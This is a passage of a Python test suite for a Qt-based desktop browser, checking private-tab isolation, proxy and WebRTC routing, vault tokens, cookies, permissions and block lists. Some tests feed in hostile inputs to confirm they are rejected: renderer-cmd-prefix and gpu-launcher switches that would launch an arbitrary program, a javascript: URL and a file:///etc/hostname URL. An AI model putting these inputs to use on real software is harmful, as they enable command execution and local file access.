      "--disable-gpu-vsync" in _flags_now and "cmd-prefix" not in _flags_now
      and "gpu-launcher" not in _flags_now, _flags_now)

# behind a proxy of his, WebRTC stays inside it
_wp = {"webrtcGuard": True, "activeProxy": "mine",
       "proxyProfiles": [{"name": "mine", "type": "socks5",
                          "host": "127.0.0.1", "port": 1080}]}
_with = B._privacy_flags(_wp)
_without = B._privacy_flags({"webrtcGuard": True})
_guard_only = B._privacy_flags(dict(_wp, webrtcGuard=False, guardNoWebRTC=True))
check("with a proxy in use, WebRTC sends no UDP past it",
      any("disable_non_proxied_udp" in f for f in _with)
      and any("default_public_interface_only" in f for f in _without)
      and any("disable_non_proxied_udp" in f for f in _guard_only),
      str((_with, _without, _guard_only)))

# remembering a graphics card never writes over a config that does not
# read, and keeps everything else in one that does
_gr = getattr(B, "_gpu_remember", None)
br.save_config()
_cfg_text = B.CONFIG_FILE.read_text(encoding="utf-8")
B.CONFIG_FILE.write_text('{"theme": "mocha", "cut short', encoding="utf-8")
_bad_ok = _gr("cardX", True) if _gr else "missing"
_bad_after = B.CONFIG_FILE.read_text(encoding="utf-8")
B.CONFIG_FILE.write_text(_cfg_text, encoding="utf-8")
_good_ok = _gr("cardY", True) if _gr else "missing"
_good_after = B.json.loads(B.CONFIG_FILE.read_text(encoding="utf-8"))
br.save_config()
check("a graphics card choice leaves an unreadable config as it is",
      _bad_ok is False and _bad_after.endswith("cut short"), str(_bad_ok))
check("...and adds itself to a readable one without losing the rest",
      _good_ok is True and _good_after.get("gpuCard") == "cardY"
      and len(_good_after) > 3, str((_good_ok, len(_good_after))))

# a site rule whose proxy was deleted refuses the site, never goes direct
_routing = B._proxy_routing({"activeProxy": "direct", "proxyProfiles": [],
                             "proxyAuto": {"rules": [
                                 {"pattern": "bank.invalid",
                                  "profile": "gone"}]}})
_rp = B.RuleProxy([("bank.invalid", ("block",))], [], ("direct",))
import socket as _sock2
_c = _sock2.create_connection(("127.0.0.1", _rp.port), 5)
_c.sendall(b"CONNECT bank.invalid:443 HTTP/1.1\r\nHost: bank.invalid:443\r\n\r\n")
_c.settimeout(5)
try:
    _answer = _c.recv(64)
except OSError:
    _answer = b""
_c.close(); _rp.close()
check("a site rule whose proxy is gone refuses the site instead of going direct",
      _routing and _routing[0][0][1] == ("block",)
      and _answer.startswith(b"HTTP/1.1 502"), str((_routing, _answer)))

# his chat filter rules stay out of the page's reach
v34 = br.new_tab(); H.spin(300)
H.load(v34, srv.url("/chatpage")); H.spin(500)
# the start page's own loadFinished can end H.load before this page has
# even started under a CPU quota: wait for THIS document
H.wait_for(lambda: "/chatpage" in v34.url().toString()
           and jsq(v34, "document.readyState", B.MAIN_WORLD_ID) == "complete"
           and jsq(v34, "!!document.getElementById('c1')", B.MAIN_WORLD_ID),
           20000)
br.play_tool("chatfilter", view=v34,
             arg={"hide": ["spoiler"], "me": ["qwmyname"]})
H.wait_for(lambda: jsq(v34, "getComputedStyle(document.getElementById('c1'))"
                             ".display", B.MAIN_WORLD_ID) == "none", 20000)
_rules_seen = H.js(v34, "typeof window.__chatRules", B.MAIN_WORLD_ID)
_c1 = H.js(v34, "getComputedStyle(document.getElementById('c1')).display",
           B.MAIN_WORLD_ID)
check("the chat filter hides a line without handing the page his rules",
      _rules_seen == "undefined" and _c1 == "none", str((_rules_seen, _c1)))

# a private window's later tabs are private too, and no private tab's
# address is kept in the window state
_pw_win = br.new_private_window(); H.spin(800)
_pw_tab = _pw_win.new_tab(url=srv.url("/twhome")); H.spin(800)
_pw_ok = (getattr(_pw_tab, "private", False) is True
          and _pw_tab.page().profile().isOffTheRecord())
_ws_priv = br.new_tab(private=True); H.spin(300)
H.load(_ws_priv, srv.url("/twother?secret=1")); H.spin(400)
_ws = br.save_window_state()
check("a second tab in a private window is private as well",
      _pw_ok, str((getattr(_pw_tab, "private", None),)))
check("...and a private tab's address is not kept in the window state",
      not any("secret=1" in u for u in _ws.get("tabs", [])), str(_ws.get("tabs")))
for _t in (_ws_priv,):
    _close_if_open(_t)
try:
    _pw_win.close()
except RuntimeError:
    pass
H.spin(300)

# Settings is told what is saved, not only the first 177 keys
_set_keys = ("adBlock", "notesFolder", "snippetsText", "spoilerShield",
             "pauseForCalls", "formDraftsOn")
_set_was = {k: br.config.get(k, "__absent__") for k in _set_keys}
br.config.update(adBlock=True, notesFolder="/tmp/review-notes",
                 snippetsText=";a=b", spoilerShield=True, pauseForCalls=True)
br.config.pop("formDraftsOn", None)
_sset = B.json.loads(br.bridge.getSettings())
for _k, _v in _set_was.items():
    if _v == "__absent__":
        br.config.pop(_k, None)
    else:
        br.config[_k] = _v
check("Settings is sent the switches and fields it shows, as saved",
      _sset.get("adBlock") is True and _sset.get("notesFolder") == "/tmp/review-notes"
      and _sset.get("snippetsText") == ";a=b" and _sset.get("spoilerShield") is True
      and _sset.get("pauseForCalls") is True,
      str({k: _sset.get(k) for k in _set_keys}))
check("...and an unsaved one with the browser's own default",
      _sset.get("formDraftsOn") is True, str(_sset.get("formDraftsOn")))

# ===== batch 31: the second pass's mediums ===========================
# the 1Password token still opens after the master passphrase changes
_tdir = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
_tl = B.VaultLock(_tdir)
_tl.write({"items": [{"host": "x", "password": "p"}]})
_tl.enable("first pass phrase")
_tl._token_store(b"op-token-xyz")
_tok_before = _tl._token_plain()
_changed = _tl.change("first pass phrase", "second pass phrase")
_tl2 = B.VaultLock(_tdir)
_tl2.unlock("second pass phrase")
check("a new master passphrase keeps the 1Password token readable",
      _tok_before == b"op-token-xyz" and _changed
      and _tl2._token_plain() == b"op-token-xyz",
      str((_tok_before, _changed, _tl2._token_plain())))

# lite mode on and off gives his own "block autoplay" back
_attr = B.QWebEngineSettings.WebAttribute.PlaybackRequiresUserGesture
_lite_keys = ("liteMode", "blockAutoplay", "blockAutoplayOwn")
_lite_was = {k: br.config.get(k, "__absent__") for k in _lite_keys}
br.config.update(liteMode=False, blockAutoplay=True)
br.config.pop("blockAutoplayOwn", None)
br.lite_mode(True); br.lite_mode(False)
_lite_on = (br.config.get("blockAutoplay"),
            br.profile.settings().testAttribute(_attr))
br.bridge.setSetting("blockAutoplay", "false")
br.lite_mode(True); br.lite_mode(False)
_lite_off = (br.config.get("blockAutoplay"),
             br.profile.settings().testAttribute(_attr))
for _k, _v in _lite_was.items():
    if _v == "__absent__":
        br.config.pop(_k, None)
    else:
        br.config[_k] = _v
br.apply_web_attributes()
check("lite mode on and off keeps 'block autoplay' on when he had it on",
      _lite_on == (True, True), str(_lite_on))
check("...and off when he had it off", _lite_off == (False, False),
      str(_lite_off))

# a reader made from a private tab's selection opens in a private tab
_pv = br.new_tab(private=True); H.spin(300)
H.load(_pv, srv.url("/twhome"))
_real_rpt = br.read_page_tool
br.read_page_tool = (lambda name, view=None, then=None, **k:
                     then(json.dumps({"html": "<p>x</p>", "title": "t"})))
try:
    br.reader_from_selection(view=_pv)
finally:
    br.read_page_tool = _real_rpt
H.spin(300)
_rd = br.current()
check("a reader from a private selection opens in a private tab",
      _rd is not _pv and getattr(_rd, "private", False) is True,
      str(getattr(_rd, "private", None)))
if _rd is not _pv:
    _close_if_open(_rd)

# a cookie set by hand in a private tab goes into the private jar
br.tabs.setCurrentWidget(_pv); H.spin(200)
br.set_cookie("k31", "v31", secure=False)
H.wait_for(lambda: "k31=v31" in (jsq(_pv, "document.cookie",
                                      B.MAIN_WORLD_ID) or ""), 5000)
_pc = H.js(_pv, "document.cookie", B.MAIN_WORLD_ID) or ""
_nv = br.new_tab(url=None); H.spin(200)
H.load(_nv, srv.url("/twhome"))
# the page itself (H.load can return on the start page's load, and a js()
# sent while the tab swaps from our page's channel to the web one waited
# out its 5 s: 2 runs in 6 under the CPU quota)
H.wait_for(lambda: "twhome" in _nv.url().toString() and _nv.title() == "tw",
           10000)
H.spin(300)
_nc = jsq(_nv, "document.cookie", B.MAIN_WORLD_ID) or ""
br.tabs.setCurrentWidget(_pv); H.spin(200)
_rows = [r for r in br.site_cookies() if r.get("name") == "k31"]
check("a cookie set in a private tab reaches that tab",
      "k31=v31" in _pc, _pc)
check("...is listed for it, and stays out of the normal jar",
      _rows and "k31" not in _nc, str((len(_rows), _nc)))
_close_if_open(_nv)

# a private tab's fake place and user agent stay out of config.json
br.tabs.setCurrentWidget(_pv); H.spin(200)
_ph = _pv.url().host()
br.override_place(view=_pv, lat=1.5, lon=2.5)
br.set_agent(name="firefox", view=_pv)
_disk = json.loads(B.CONFIG_FILE.read_text() or "{}")
_gname = B.page_guard.GUARD_SCRIPT_NAME
_pscr = [s.sourceCode() for s in _pv.page().profile().scripts().find(_gname)]
_mscr = [s.sourceCode() for s in br.profile.scripts().find(_gname)]
check("a private tab's fake place is not written to config.json",
      _ph not in (br.config.get("fakePlaces") or {})
      and _ph not in (_disk.get("fakePlaces") or {}),
      str(br.config.get("fakePlaces")))
check("...but the private jar's guard has it, and the normal one not",
      any("1.5" in s and _ph in s for s in _pscr)
      and not any("1.5" in s and _ph in s for s in _mscr))
check("a private tab's user agent is not written to config.json",
      _ph not in br.agent_sites() and _ph not in (_disk.get("agentSites") or {}),
      str(br.agent_sites()))
check("...but the private jar is told it, and the normal jar not",
      "Firefox" in br.agent_for(_ph, private=True)
      and "Firefox" not in br.agent_for(_ph))

# "Off" in the slow-connection menu takes back the offline it switched on
_off_was = br.config.get("offline", False)
br.config["offline"] = False
br.throttle(view=_pv, profile="offline"); _o1 = br.config.get("offline")
br.throttle(view=_pv, profile="off"); _o2 = br.config.get("offline")
br.config["offline"] = True
br.throttle(view=_pv, profile="offline"); br.throttle(view=_pv, profile="off")
_o3 = br.config.get("offline")
br.config["offline"] = _off_was
br.config.pop("offlineByThrottle", None)
check("throttle Offline then Off leaves the browser online",
      _o1 is True and _o2 is False, str((_o1, _o2)))
check("...and his own offline switch is left alone", _o3 is True, str(_o3))

# nothing typed into a password field is kept for the recording
_rv = br.new_tab(url=None); H.spin(200)
H.load(_rv, srv.url("/pwform"))
# the form's own document: H.load can return on the start page's
# loadFinished, and the recorder then went into that one
H.wait_for(lambda: "/pwform" in _rv.url().toString()
           and jsq(_rv, "!!document.getElementById('p')"
                        " && document.readyState === 'complete'",
                   B.MAIN_WORLD_ID) is True, 15000)
H.js(_rv, B.PERF_JS.replace("PERFWANT", json.dumps({"recordClicks": True})),
     B.APP_WORLD_ID)
H.js(_rv, "['u','p'].forEach(function (id) { var el = document.getElementById(id);"
          " el.focus(); ['s','e','c'].forEach(function (k) {"
          " el.dispatchEvent(new KeyboardEvent('keydown', {key: k + id,"
          " bubbles: true})); }); }); 1", B.APP_WORLD_ID)
_keys = [r.get("key") for r in json.loads(
    H.js(_rv, "window.__recInputTake ? window.__recInputTake() : '[]'",
         B.APP_WORLD_ID) or "[]")]
check("keys typed in a password field are not kept for the recording",
      "su" in _keys and not any(str(k).endswith("p") for k in _keys),
      str(_keys))
_close_if_open(_rv)

# the transcript note keeps each line's time
class _Desk31:
    body = None

    def save_note(self, title="", body="", link="", tags=()):
        _Desk31.body = body
        return {"title": title}
_real_desk, _real_tr = br.desk, br.transcript
br.desk = lambda: _Desk31()
br.transcript = lambda view=None, then=None: then(
    [{"t": 75, "e": 80, "text": "hi"}, {"t": 3725, "text": "later"}])
try:
    br.transcript_to_note(view=_pv)
finally:
    br.desk, br.transcript = _real_desk, _real_tr
check("a transcript note stamps each line with its own time",
      _Desk31.body == "[1:15] hi\n[1:02:05] later", repr(_Desk31.body))

# captions without hours (openai-whisper) and with CRLF still go on
_cv = br.new_tab(url=None); H.spin(200)
H.load(_cv, srv.url("/vid"))
_cap = {}
br.put_captions_on_video(
    "WEBVTT\r\n\r\n00:03.000 --> 00:06.500 align:start\r\nhello there\r\n"
    "\r\n01:00:01.000 --> 01:00:02.000\r\nlater on\r\n",
    view=_cv, then=lambda r: _cap.update(r))
H.wait_for(lambda: _cap, 5000)
_cues = json.loads(H.js(_cv, "JSON.stringify([].slice.call("
                         "document.getElementById('v').textTracks[0].cues)"
                         ".map(function (c) { return [c.startTime, c.text]; }))",
                         B.MAIN_WORLD_ID) or "[]")
check("captions with mm:ss cue times and CRLF lines are put on the video",
      _cap.get("cues") == 2 and _cues == [[3, "hello there"], [3601, "later on"]],
      str((_cap, _cues)))
for _t in (_cv, _pv):
    _close_if_open(_t)
H.spin(300)

# ===== batch 32 =======================================================
# a font file from the menu: resolved against the page, web only, and
# private from a private tab
_fv = br.new_tab(url=None); H.spin(200)
H.load(_fv, srv.url("/twhome"))
_ft = br._open_font_file("/fonts/f.woff2", _fv)
H.wait_for(lambda: _ft is not None and _ft.url().toString(), 8000)
_ft_url = _ft.url().toString() if _ft is not None else ""
_ff = br._open_font_file("file:///etc/hostname", _fv)
_fj = br._open_font_file("javascript:alert(1)", _fv)
check("a font file's relative address opens on the page's own site",
      _ft_url == srv.url("/fonts/f.woff2"), _ft_url)
check("...and a file:// or javascript: one opens nothing",
      _ff is None and _fj is None, str((_ff, _fj)))
for _t in (_ft,):
    if _t is not None:
        _close_if_open(_t)
_pfv = br.new_tab(private=True); H.spin(200)
H.load(_pfv, srv.url("/twhome"))
_pft = br._open_font_file("/fonts/g.woff2", _pfv); H.spin(300)
check("...from a private tab, in a private tab",
      _pft is not None and getattr(_pft, "private", False) is True)
for _t in (_pft, _pfv):
    if _t is not None:
        _close_if_open(_t)

# a caption run whose download fails does not reuse the last run's files
import os as _os, stat as _stat
_cd = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
(B.CONFIG_FILE.parent / "autocap.wav").write_bytes(b"\0" * 4000)
(B.CONFIG_FILE.parent / "autocap.vtt").write_text(
    "WEBVTT\n\n00:00:00.000 --> 00:00:02.000\nlast video's words\n")
_mk = _cd / "maker.sh"
_mk.write_text("#!/bin/sh\nexit 1\n")
_tr = _cd / "words.sh"
_tr.write_text("#!/bin/sh\ntouch '%s'\n" % (_cd / "ran"))
for _f in (_mk, _tr):
    _f.chmod(_f.stat().st_mode | _stat.S_IEXEC)
_tmp_before = set(_Path(_tempfile.gettempdir()).glob("browser-autocap-*"))
_cj = {}
br._caption_job("http://127.0.0.1:9/x.mp4", str(_mk), str(_tr), view=_fv,
                then=lambda r: _cj.update(done=r))
H.wait_for(lambda: "done" in _cj, 15000)
H.spin(500)
_tmp_after = set(_Path(_tempfile.gettempdir()).glob("browser-autocap-*"))
check("a caption run whose download failed transcribes nothing",
      _cj.get("done") == {} and not (_cd / "ran").exists(), str(_cj))
check("...and leaves no folder of its own behind",
      not (_tmp_after - _tmp_before), str(_tmp_after - _tmp_before))
for _n in ("autocap.wav", "autocap.vtt"):
    try:
        (B.CONFIG_FILE.parent / _n).unlink()
    except OSError:
        pass

# one fullscreen-bar poll at a time, ending with the bar
br.offer_fullscreen_rule("a.test", view=_fv)
_t1 = br._fsbar_timer
br.offer_fullscreen_rule("b.test", view=_fv)
_t2 = br._fsbar_timer
try:
    _t1_live = _t1.isActive()
except RuntimeError:
    _t1_live = False
check("a second fullscreen bar stops the first one's poll",
      _t2 is not _t1 and not _t1_live and _t2.isActive())
_t2._until = B.time.monotonic() - 1
H.wait_for(lambda: br._fsbar_timer is None, 3000)
check("...and the poll ends once the bar has timed out",
      br._fsbar_timer is None)

# translating a background tab translates that tab, not the one in front
_ta = br.new_tab(url=None, switch=False); H.spin(200)
H.load(_ta, srv.url("/twhome"))
_tb = br.new_tab(url=None); H.spin(200)
H.load(_tb, srv.url("/twhome"))
_loads = []
_ta.load = lambda u: _loads.append(("A", u.toString()))
_tb.load = lambda u: _loads.append(("B", u.toString()))
_tl_was = (br.config.get("translateLang"), br.config.get("captionTranslator"))
br.config["captionTranslator"] = ""
try:
    br.translate_page_now(view=_ta, lang=_tl_was[0] or "en")
finally:
    if _tl_was[0] is None:
        br.config.pop("translateLang", None)
    else:
        br.config["translateLang"] = _tl_was[0]
    if _tl_was[1] is None:
        br.config.pop("captionTranslator", None)
    else:
        br.config["captionTranslator"] = _tl_was[1]
check("translating a tab sends that tab, not the one in front",
      [w for w, _u in _loads] == ["A"], str(_loads))
for _t in (_ta, _tb):
    _close_if_open(_t)

# a bookmark restore keeps what was there in a backup first
_bk_was = list(br.bookmarks)
_bdir = br.bookmark_backup_dir()
_bdir.mkdir(parents=True, exist_ok=True)
(_bdir / "bookmarks-2001-01-01.json").write_text(json.dumps(
    [{"id": 1, "type": "link", "title": "old", "url": "https://old.example/",
      "parent": 0}]))
br.bookmarks = [{"id": 7, "type": "link", "title": "added today",
                 "url": "https://new.example/", "parent": 0}]
_before_names = set(br.bookmark_backups())
_rn = br.restore_bookmark_backup("bookmarks-2001-01-01.json")
_new_names = set(br.bookmark_backups()) - _before_names
_kept = any("new.example" in (_bdir / n).read_text() for n in _new_names)
br.bookmarks = _bk_was
br.save_bookmarks()
for _n in _new_names | {"bookmarks-2001-01-01.json"}:
    try:
        (_bdir / _n).unlink()
    except OSError:
        pass
check("restoring a bookmark backup first backs up what is there",
      _rn == 1 and _kept, str((_rn, sorted(_new_names))))

# a full-page capture gives a pinned element its own inline position back
_cpv = br.new_tab(url=None); H.spin(200)
H.load(_cpv, srv.url("/pinned"))
H.js(_cpv, B.capture.CLEAN_JS % "true", B.APP_WORLD_ID)
_mid = H.js(_cpv, "getComputedStyle(document.getElementById('h')).position",
            B.MAIN_WORLD_ID)
H.js(_cpv, B.capture.CLEAN_JS % "false", B.APP_WORLD_ID)
_aft = H.js(_cpv, "getComputedStyle(document.getElementById('h')).position",
            B.MAIN_WORLD_ID)
check("a capture pins a fixed header and gives back its inline fixed",
      _mid == "absolute" and _aft == "fixed", str((_mid, _aft)))
_close_if_open(_cpv)

# the mic test: a second Start stops the first stream
_mv = br.open_mic_test(); H.spin(800)
# the mic test's own document, not the new tab's first empty one: at a
# 30% CPU quota "complete" came from that one and the stub went into it
H.wait_for(lambda: "mictest" in _mv.url().toString()
           and jsq(_mv, "document.readyState === 'complete'"
                        " && !!document.getElementById('camstart')"
                        " && location.href.indexOf('mictest') >= 0",
                   B.MAIN_WORLD_ID) is True, 15000)
H.spin(500)
H.js(_mv, """(function () {
  window.__made = [];
  navigator.mediaDevices.getUserMedia = function (want) {
    var s;
    if (want.video) {
      var c = document.createElement('canvas'); c.width = 8; c.height = 8;
      c.getContext('2d').fillRect(0, 0, 8, 8);
      s = c.captureStream(1);
    } else {
      s = new AudioContext().createMediaStreamDestination().stream;
    }
    window.__made.push(s);
    return Promise.resolve(s);
  };
  return 1; })()""", B.MAIN_WORLD_ID)
# the page's own handler, called and awaited, twice: what is measured is
# what the second Start does to the first stream, not how a click lands
H.js(_mv, "window.__cs = []; window.__ce = [];"
          " document.getElementById('camstart').onclick().then("
          "function () { __cs.push(1); }, function (e) { __ce.push(String(e)); });"
          " 1", B.MAIN_WORLD_ID)
H.wait_for(lambda: jsq(_mv, "window.__cs.length + window.__ce.length",
                        B.MAIN_WORLD_ID) >= 1, 15000)
H.js(_mv, "document.getElementById('camstart').onclick().then("
          "function () { __cs.push(2); }, function (e) { __ce.push(String(e)); });"
          " 1", B.MAIN_WORLD_ID)
H.wait_for(lambda: jsq(_mv, "window.__cs.length + window.__ce.length",
                        B.MAIN_WORLD_ID) >= 2, 15000)
_cam1 = H.js(_mv, "window.__made[0] && window.__made[0].getTracks()[0].readyState",
             B.MAIN_WORLD_ID)
H.js(_mv, "document.getElementById('camstop').click(); 1", B.MAIN_WORLD_ID)
H.spin(300)
_cam2 = H.js(_mv, "window.__made[1] && window.__made[1].getTracks()[0].readyState",
             B.MAIN_WORLD_ID)
_cdiag = H.js(_mv, "JSON.stringify([__made.length, __cs, __ce, location.href.slice(-30)])", B.MAIN_WORLD_ID)
check("a second camera Start stops the first camera stream",
      _cam1 == "ended" and _cam2 == "ended", str((_cam1, _cam2, _cdiag)))
if _mv is not None:
    _close_if_open(_mv)
for _t in (_fv,):
    _close_if_open(_t)
H.spin(300)

# ===== batch 33 =======================================================
# a launching switch in his flags is left out however it is quoted
for _line in ('--"renderer-cmd-prefix"=/tmp/x.sh',
              '"--renderer-cmd-prefix=/tmp/x.sh"',
              "-renderer-cmd-prefix=/tmp/x.sh",
              "--gpu-launcher='/tmp/x.sh'"):
    B.CONFIG_FILE.write_text(json.dumps({"chromiumFlags": _line}))
    _fl = B._startup_flags()
    check("a launching switch written as %s is left out" % _line,
          "cmd-prefix" not in _fl and "launcher" not in _fl, _fl)
B.CONFIG_FILE.write_text(json.dumps({"chromiumFlags": "--force-dark-mode"}))
check("...and an ordinary flag still goes through",
      "--force-dark-mode" in B._startup_flags())
B.CONFIG_FILE.write_text(json.dumps(br.config))

# no DevTools port unless he switched it on
check("no DevTools port is opened by default",
      B.REMOTE_DEBUG_PORT == 0
      and not B.os.environ.get("QTWEBENGINE_REMOTE_DEBUGGING"),
      str((B.REMOTE_DEBUG_PORT,
           B.os.environ.get("QTWEBENGINE_REMOTE_DEBUGGING"))))
_iv = br.new_tab(url=None); H.spin(200)
H.load(_iv, srv.url("/twhome"))
br.toggle_inspector()
_dt = getattr(_iv, "_devtools", None)
H.wait_for(lambda: _dt is not None and "devtools" in _dt.url().toString(), 10000)
check("...and the inspector still opens, on Qt's own devtools page",
      _dt is not None and _dt.url().toString().startswith("devtools://"),
      _dt.url().toString() if _dt is not None else None)
br.toggle_inspector()
check("...and closes again", getattr(_iv, "_devtools", None) is None)

# the wheel-volume tag is centred and says one percent sign
H.load(_iv, srv.url("/vid"))
br.media_tool("wheelvolume", view=_iv); H.spin(300)
H.js(_iv, "var v = document.getElementById('v'); v.style.cssText = "
          "'display:block;width:300px;height:200px'; v.dispatchEvent("
          "new WheelEvent('wheel', {deltaY: 100, bubbles: true,"
          " cancelable: true})); 1", B.MAIN_WORLD_ID)
H.spin(200)
_vm = H.js(_iv, "(function () { var t = document.getElementById('__volmark');"
                " return t ? JSON.stringify([t.style.left, t.textContent])"
                " : ''; })()", B.MAIN_WORLD_ID)
check("the wheel-volume tag is centred and reads like 95%",
      _vm and json.loads(_vm)[0] == "50%" and json.loads(_vm)[1].endswith("%")
      and not json.loads(_vm)[1].endswith("%%"), _vm)
_close_if_open(_iv)
H.spin(300)

# ===== batch 35: what is opened from a private tab stays private ======
_sp = br.new_tab(private=True); H.spin(300)
H.load(_sp, srv.url("/links"))
br.tabs.setCurrentWidget(_sp); H.spin(200)
_n0 = br.tabs.count()
br.super_drag(srv.url("/twhome"), kind="link", background=False); H.spin(400)
_dr = br.current()
check("a link dragged out of a private tab opens in a private tab",
      _dr is not _sp and getattr(_dr, "private", False) is True,
      str(getattr(_dr, "private", None)))
if _dr is not _sp:
    _close_if_open(_dr)
br.tabs.setCurrentWidget(_sp); H.spin(200)
_before = set(id(br.tabs.widget(i)) for i in range(br.tabs.count()))
br._nav_button_middle("reload"); H.spin(400)
_mid_new = [br.tabs.widget(i) for i in range(br.tabs.count())
            if id(br.tabs.widget(i)) not in _before]
check("a middle-click on Reload in a private tab opens a private tab",
      _mid_new and all(getattr(w, "private", False) for w in _mid_new),
      str([getattr(w, "private", None) for w in _mid_new]))
for _w in _mid_new:
    _close_if_open(_w)
br.tabs.setCurrentWidget(_sp); H.spin(200)
H.js(_sp, "getSelection().selectAllChildren(document.body); 1", B.MAIN_WORLD_ID)
_before = set(id(br.tabs.widget(i)) for i in range(br.tabs.count()))
_sel = {}
br.open_selection_links(view=_sp, then=lambda r: _sel.update(v=r))
H.wait_for(lambda: "v" in _sel, 5000); H.spin(400)
_sel_new = [br.tabs.widget(i) for i in range(br.tabs.count())
            if id(br.tabs.widget(i)) not in _before]
check("links opened from a private tab's selection are private tabs",
      _sel_new and all(getattr(w, "private", False) for w in _sel_new),
      str([getattr(w, "private", None) for w in _sel_new]))
for _w in _sel_new:
    _close_if_open(_w)
# searches and the Twitch chat: where they would go, not loaded
br.tabs.setCurrentWidget(_sp); H.spin(200)
_asked = []
_real_nt = br.new_tab
br.new_tab = lambda *a, **k: _asked.append(bool(k.get("private"))) or None
_real_panel = br.open_panel
br.open_panel = lambda *a, **k: _asked.append("panel") or True
# search_image asks first, modally: answered here, or offscreen it waits
# for ever (this hung the whole suite)
_real_q35 = B.QMessageBox.question
B.QMessageBox.question = staticmethod(
    lambda *a, **k: B.QMessageBox.StandardButton.Yes)
try:
    br.search_for("hello review", new_tab=True)
    br.search_image("https://img.example/a.png")
    br.open_twitch_chat("somechannel")
finally:
    br.new_tab = _real_nt
    br.open_panel = _real_panel
    B.QMessageBox.question = _real_q35
check("a search, an image search and a Twitch chat from a private tab "
      "open private", _asked == [True, True, True], str(_asked))
# HTTP auth in a private tab: no saved login goes out by itself
class _Auth35:
    user = None

    def setUser(self, u):
        _Auth35.user = u

    def setPassword(self, p):
        pass
_vault_ok = br.vault is not None and not br.vault_locked()
if _vault_ok:
    br.vault.set_entry("127.0.0.1", "http", "ada35", "pw35")
_real_gt = B.QInputDialog.getText
B.QInputDialog.getText = staticmethod(lambda *a, **k: ("", False))
# the same login in a NORMAL tab on the same page is filled -- without
# that, "nothing was filled in the private tab" proves nothing
br.tabs.setCurrentWidget(view); H.spin(200)    # opened from a normal tab
_nt35 = br.new_tab(url=None); H.spin(200)
H.load(_nt35, srv.url("/links"))
H.wait_for(lambda: "/links" in _nt35.url().toString(), 10000)
br._auth_tried = {}
# an earlier section leaves Vault Password off, and with it off nothing
# is ever filled -- which made the private check below pass for nothing
_vpw_was = br.config.get(B.VAULT_PASSWORD_KEY, "__absent__")
br.config[B.VAULT_PASSWORD_KEY] = True
try:
    _au_n = br._http_auth(srv.url("/links"), _Auth35(), view=_nt35)
    _user_n, _Auth35.user = _Auth35.user, None
    br._auth_tried = {}
    br.tabs.setCurrentWidget(_sp); H.spin(200)
    _au = br._http_auth(srv.url("/links"), _Auth35(), view=_sp)
finally:
    B.QInputDialog.getText = _real_gt
    if _vpw_was == "__absent__":
        br.config.pop(B.VAULT_PASSWORD_KEY, None)
    else:
        br.config[B.VAULT_PASSWORD_KEY] = _vpw_was
check("a normal tab is signed in with the saved login (the control)",
      _vault_ok and _au_n is True and _user_n == "ada35",
      str((_vault_ok, _au_n, _user_n)))
check("...and a private tab on the same page is not",
      _vault_ok and _Auth35.user is None and _au is False,
      str((_vault_ok, _Auth35.user, _au)))
_close_if_open(_nt35)
# a permission answered in a private tab leaves no trace in config.json
class _Req35:
    def __init__(self, origin):
        self._o = B.QUrl(origin)
        self.answer = None

    def permissionType(self):
        return _QWP.PermissionType.MediaAudioCapture

    def origin(self):
        return self._o

    def grant(self):
        self.answer = True

    def deny(self):
        self.answer = False
_pt_was = json.dumps(br.config.get("permissionTimes") or {}, sort_keys=True)
_pl_was = len(br.config.get("permissionLog") or [])
br._perm_widget = None
_rq = _Req35(srv.url("/"))
_real_qwp = B.QWebEnginePermission
B.QWebEnginePermission = lambda p: p
try:
    br._permission_requested(_rq, _sp.page())
finally:
    B.QWebEnginePermission = _real_qwp
H.spin(300)
_pc = getattr(br, "_perm_widget", None)
_pa = _pc.findChild(B.QToolButton, "permallow") if _pc is not None else None
if _pa is not None:
    H.wait_for(lambda: _pa.isEnabled(), 3000)
    _pa.click(); H.spin(500)
check("a private tab's permission answer is not logged in config.json",
      _pa is not None and _rq.answer is True
      and json.dumps(br.config.get("permissionTimes") or {}, sort_keys=True) == _pt_was
      and len(br.config.get("permissionLog") or []) == _pl_was,
      str((_pa is not None, _rq.answer, len(br.config.get("permissionLog") or []), _pl_was)))
br._perm_widget = None
_close_if_open(_sp)
H.spin(300)

# ===== batch 36: a block list blocks the names under each site too =====
_bf = " ".join(B._privacy_flags({"blockHosts": ["www.example.test"],
                                 "blockReplay": True}))
check("a blocked site's subdomains are blocked as well",
      "MAP example.test 0.0.0.0" in _bf and "MAP *.example.test 0.0.0.0" in _bf
      and "MAP *.hotjar.com 0.0.0.0" in _bf, _bf[:200])
_big = B._privacy_flags({"blockHosts": ["h%05d.example" % i for i in range(5000)]})
_bigr = [f for f in _big if f.startswith("--host-resolver-rules")][0]
check("...and a long list is cut at whole pairs, under the cap",
      len(_bigr) < 60100 and _bigr.rstrip('"').endswith(" 0.0.0.0")
      and _bigr.count("MAP *.") == _bigr.count("MAP ") // 2, len(_bigr))

# a saved auto-hide is applied when a window starts
br.config["autoHideChrome"] = True
_ah = br.new_private_window(); H.spin(600)
_ah_shown = getattr(_ah, "_chrome_shown", True)
br.config["autoHideChrome"] = False
try:
    _t = getattr(_ah, "_peek_timer", None)
    if _t is not None:
        _t.stop()
    _ah.close()
except RuntimeError:
    pass
H.spin(300)
check("a saved auto-hide toolbar is hidden when a window starts",
      _ah_shown is False, str(_ah_shown))

# a second appearance reset keeps the first one's backup
_ap_was = {k: br.config.get(k, "__absent__")
           for k in ("customThemes", "theme", "appearanceBackup")}
br.config["customThemes"] = {"review-own": {"bg": "#101010"}}
br.reset_appearance()
br.reset_appearance()
_ap_bk = br.config.get("appearanceBackup") or {}
for _k, _v in _ap_was.items():
    if _v == "__absent__":
        br.config.pop(_k, None)
    else:
        br.config[_k] = _v
br.load_custom_themes()
br.apply_theme(br.config.get("theme", B.DEFAULT_THEME), save=False)
check("a second appearance reset keeps his own themes in the backup",
      "review-own" in (_ap_bk.get("customThemes") or {}), str(_ap_bk)[:200])

# ===== batch 37: page look per site, and by the clock ==================
_la = br.new_tab(url=None); H.spin(200)
H.load(_la, srv.url("/twhome"))
_lb = br.new_tab(url=None); H.spin(200)
H.load(_lb, srv.url("/twhome").replace("127.0.0.1", "localhost"))
br.tabs.setCurrentWidget(_la); H.spin(200)
br.set_site_font_size("127.0.0.1", 23); H.spin(600)
_fa = H.js(_la, "getComputedStyle(document.documentElement).fontSize",
           B.MAIN_WORLD_ID)
_fb = H.js(_lb, "getComputedStyle(document.documentElement).fontSize",
